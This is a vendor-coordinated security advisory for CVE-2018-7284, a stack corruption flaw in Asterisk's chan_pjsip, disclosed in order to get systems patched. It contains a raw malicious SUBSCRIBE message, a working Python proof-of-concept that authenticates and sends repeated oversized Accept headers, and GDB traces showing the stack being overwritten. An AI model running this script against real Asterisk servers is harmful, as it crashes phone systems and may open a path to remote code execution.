# SUBSCRIBE message with a large Accept value causes stack corruption

- Authors: 
     - Alfred Farrugia <alfred@enablesecurity.com>
     - Sandro Gauci <sandro@enablesecurity.com>
- Latest vulnerable version: Asterisk 15.2.0 running `chan_pjsip`
- Tested vulnerable versions: 15.2.0, 13.19.0, 14.7.5, 13.11.2
- References: AST-2018-004, CVE-2018-7284
- Advisory URL: <https://github.com/EnableSecurity/advisories/tree/master/ES2018-01-asterisk-pjsip-subscribe-stack-corruption>
- Vendor Advisory: <http://downloads.asterisk.org/pub/security/AST-2018-004.html>
- Timeline:
    - Issue reported to vendor: 2018-01-30
    - Vendor patch made available to us: 2018-02-06
    - Vendor advisory published: 2018-02-21
    - Enable Security advisory: 2018-02-22

## Description

A large SUBSCRIBE message with multiple malformed `Accept` headers will crash Asterisk due to stack corruption.

## Impact

Abuse of this vulnerability leads to denial of service in Asterisk when `chan_pjsip` is in use. Brief analysis indicates that this is an exploitable vulnerability that may lead to remote code execution.

## How to reproduce the issue

The following SIP message was used to reproduce the issue:

```
SUBSCRIBE sip:3000@127.0.0.1:5060 SIP/2.0
To: <sip:3000@127.0.0.1:5060>
From: Test <sip:3000@127.0.0.1:5060>
Call-ID: 1627b84b-b57d-4256-a748-30d01d242199
CSeq: 2 SUBSCRIBE
Via: SIP/2.0/TCP 172.17.0.1:10394;branch=z9hG4bK1627b84b-b57d-4256-a748-30d01d242199
Contact: <sip:3000@172.17.0.1>
Accept: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Accept: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Accept: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
(REPEAT ACCEPT FOR 50 TIMES)
Event: message-summary
Allow: Allow: SUBSCRIBE, NOTIFY, INVITE, ACK, CANCEL, BYE, REFER, INFO, OPTIONS, MESSAGE
Authorization: Digest username="3000",realm="asterisk",nonce="1517181436/80170188d05f4af45b8530366c8e7e5e",uri="sip:127.0.0.1:5060",response="a4a88b777731349899227dc3170efdcf",algorithm=md5
Content-Length: 0
```

Notes: 

- authentication may be required

The following script was used to reproduce the issue:

```python
#!/usr/bin/env python
import socket
import ssl
import re
import md5
import uuid

PROTO = "udp"
SERVER_IP = "127.0.0.1"
SERVER_PORT = 5060
USERNAME = "3000"
PASSWORD = "3000"
SUBSCRIBE_USERNAME = "3000"

# default to SIP TCP
socktype = socket.SOCK_STREAM
if PROTO == "udp":
    socktype = socket.SOCK_DGRAM
sock = socket.socket(socket.AF_INET, socktype)
if PROTO == "tls":
    sock = ssl.wrap_socket(sock, ssl_version=ssl.PROTOCOL_TLSv1)

sock.connect((SERVER_IP, SERVER_PORT))


callid = str(uuid.uuid4())
msg = "SUBSCRIBE sip:%s@%s:%i SIP/2.0\r\n" \
    "To: <sip:%s@%s:%i>\r\n" \
    "From: Test <sip:%s@%s:%s>\r\n" \
    "Call-ID: %s\r\n" \
    "CSeq: 2 SUBSCRIBE\r\n" \
    "Via: SIP/2.0/TCP 172.17.0.1:10394;branch=z9hG4bK%s\r\n" \
    "Contact: <sip:%s@172.17.0.1>\r\n" \
    "Accept: application/simple-message-summary\r\n" \
    "Event: message-summary\r\n" \
    "Allow: Allow: SUBSCRIBE, NOTIFY, INVITE, ACK, CANCEL, BYE, REFER, INFO, OPTIONS, MESSAGE\r\n" \
    "{{AUTH}}" \
    "Content-Length: 0\r\n" \
    "\r\n" % (
        SUBSCRIBE_USERNAME, SERVER_IP, SERVER_PORT,
        SUBSCRIBE_USERNAME, SERVER_IP, SERVER_PORT,
        USERNAME, SERVER_IP, SERVER_PORT,
        callid, callid,
        USERNAME)

sock.sendall(msg.replace("{{AUTH}}", ""))

data = sock.recv(10240)

if data.startswith("SIP/2.0 401"):
    for line in data.split('\r\n'):
        if line.startswith("WWW-Authenticate"):
            content = line.split(':', 2)[1].strip()
            realm = re.search("realm=\"([a-z]+)\"", content).group(1)
            nonce = re.search("nonce=\"([a-z0-9\/]+)\"", content).group(1)
            ha1 = md5.new(USERNAME + ":" + realm + ":" + PASSWORD).hexdigest()
            uri = "sip:%s:%i" % (SERVER_IP, SERVER_PORT)
            ha2 = md5.new("SUBSCRIBE:" + uri).hexdigest()
            r = md5.new(ha1 + ":" + nonce + ":" + ha2).hexdigest()

            auth = "Authorization: Digest username=\"%s\"," % (USERNAME) + \
                "realm=\"%s\"," % (realm) + \
                "nonce=\"%s\"," % (nonce) + \
                "uri=\"%s\"," % (uri) + \
                "response=\"%s\"," % (r) + \
                "algorithm=md5\r\n"
            print(auth)
    newmsg = ""
    for line in msg.split('\r\n'):
        if line.startswith('Accept'):
            for _ in range(64):
                newmsg += 'Accept: ' + 'A' * 8 + '\r\n'
        else:
            newmsg += line + '\r\n'

    newmsg = newmsg.replace("{{AUTH}}", auth)
    print(newmsg)
    sock.sendall(newmsg)
```

GDB Output:

```
2872		if (expires_header) {
(gdb) bt
#0  0x00007ffff1618000 in pubsub_on_rx_subscribe_request (rdata=rdata@entry=0x7fffe00132f8) at res_pjsip_pubsub.c:2872
#1  0x00007ffff1618938 in pubsub_on_rx_request (rdata=0x7fffe00132f8) at res_pjsip_pubsub.c:3559
#2  0x00007ffff7864e97 in pjsip_endpt_process_rx_data (endpt=<optimized out>, rdata=0x4141414141414141, p=<optimized out>, 
    p_handled=0x7ffff0480d44) at ../src/pjsip/sip_endpoint.c:893
#3  0x00007ffff11ca200 in strcpy (__src=0x7fffe00132f8 "\300.", __dest=0x0) at /usr/include/x86_64-linux-gnu/bits/string3.h:110
#4  record_serializer (tdata=0x7fffe00095f0) at res_pjsip/pjsip_distributor.c:92
#5  0x00000000005fc6fe in ast_taskprocessor_execute (tps=0x769a652ff4df0300, tps@entry=0xff0348) at taskprocessor.c:963
#6  0x0000000000603960 in execute_tasks (data=0xff0348) at threadpool.c:1322
#7  0x00000000005fc6fe in ast_taskprocessor_execute (tps=0x958d58) at taskprocessor.c:963
#8  0x0000000000603e40 in threadpool_execute (pool=0x957f98) at threadpool.c:351
#9  worker_active (worker=0x7fffa0000fa8) at threadpool.c:1105
#10 worker_start (arg=0x7fffa0000fa8) at threadpool.c:1024
#11 0x000000000060ed00 in __ast_malloc (file=0x6753b0 "uri.c", func=<optimized out>, lineno=307, len=<optimized out>)
    at /usr/local/src/asterisk-15.2.0/include/asterisk/utils.h:535
#12 ast_uri_make_host_with_port (uri=<optimized out>) at uri.c:307
#13 0x00007fffa0000c20 in ?? ()
#14 0x76f0f5cbfb310371 in ?? ()
#15 0x890f159a3c370371 in ?? ()
#16 0x00007fff00000000 in ?? ()
#17 0x00007ffff0480ef0 in ?? ()
#18 0x4141414141414141 in ?? ()
#19 0x00007ffff5241100 in arena_thread_freeres () at arena.c:927
#20 0x769a652ff4df0300 in ?? ()
#21 0x0000000000000000 in ?? ()
```

By increasing the amount of `Accept` headers in the python script, we see stack smashing actually occurring. Although this may not work on UDP due to packet limitations, it has been verified to work on TLS/TCP. The above script would need to be slightly modified to create 64 `Accept` headers each with a value of 100 bytes, as follows:

```python
            for _ in range(64):
                newmsg += 'Accept: ' + 'A' * 100 + '\r\n'
```

GDB Output:

```
*** stack smashing detected ***: /opt/asterisk/sbin/asterisk terminated

Thread 25 "asterisk" received signal SIGABRT, Aborted.
[Switching to Thread 0x7ffff0481700 (LWP 129)]
0x00007ffff5101428 in __GI_raise (sig=sig@entry=6) at ../sysdeps/unix/sysv/linux/raise.c:54
54	../sysdeps/unix/sysv/linux/raise.c: No such file or directory.
(gdb) bt
#0  0x00007ffff5101428 in __GI_raise (sig=sig@entry=6) at ../sysdeps/unix/sysv/linux/raise.c:54
#1  0x00007ffff510302a in __GI_abort () at abort.c:89
#2  0x00007ffff51437ea in __libc_message (do_abort=do_abort@entry=1, fmt=fmt@entry=0x7ffff525b49f "*** %s ***: %s terminated\n") at ../sysdeps/posix/libc_fatal.c:175
#3  0x00007ffff51e515c in __GI___fortify_fail (msg=<optimized out>, msg@entry=0x7ffff525b481 "stack smashing detected") at fortify_fail.c:37
#4  0x00007ffff51e5100 in __stack_chk_fail () at stack_chk_fail.c:28
#5  0x00007ffff1613be2 in subscription_get_generator_from_rdata (handler=<optimized out>, handler=<optimized out>, rdata=<optimized out>) at res_pjsip_pubsub.c:755
#6  0x4141414141414141 in ?? ()
#7  0x4141414141414141 in ?? ()
#8  0x4141414141414141 in ?? ()
#9  0x4141414141414141 in ?? ()
#10 0x4141414141414141 in ?? ()
#11 0x4141414141414141 in ?? ()
#12 0x0041414141414141 in ?? ()
#13 0x4141414141414141 in ?? ()
#14 0x4141414141414141 in ?? ()
#15 0x4141414141414141 in ?? ()
#16 0x4141414141414141 in ?? ()
#17 0x4141414141414141 in ?? ()
#18 0x4141414141414141 in ?? ()
#19 0x4141414141414141 in ?? ()
#20 0x0041414141414141 in ?? ()
#21 0x4141414141414141 in ?? ()
#22 0x4141414141414141 in ?? ()
#23 0x4141414141414141 in ?? ()
#24 0x4141414141414141 in ?? ()
#25 0x4141414141414141 in ?? ()
#26 0x4141414141414141 in ?? ()
#27 0x4141414141414141 in ?? ()
#28 0x0041414141414141 in ?? ()
#29 0x4141414141414141 in ?? ()
#30 0x4141414141414141 in ?? ()
#31 0x4141414141414141 in ?? ()
```

This security issue was discovered through the use of simple fuzzing with [Radamsa](https://github.com/aoh/radamsa) and our internal toolset.

## Solutions and recommendations

Apply the patch issued by Asterisk at <http://www.asterisk.org/security> or upgrade to the latest release.

## About Enable Security

[Enable Security](https://www.enablesecurity.com) provides Information Security services, including Penetration Testing, Research and Development, to help protect client networks and applications against online attackers.

## Disclaimer

The information in the advisory is believed to be accurate at the
time of publishing based on currently available information. Use of the
information constitutes acceptance for use in an AS IS condition. There are no
warranties with regard to this information. Neither the author nor the publisher accepts any liability for any direct, indirect, or consequential loss or damage arising from use of, or reliance on, this information.
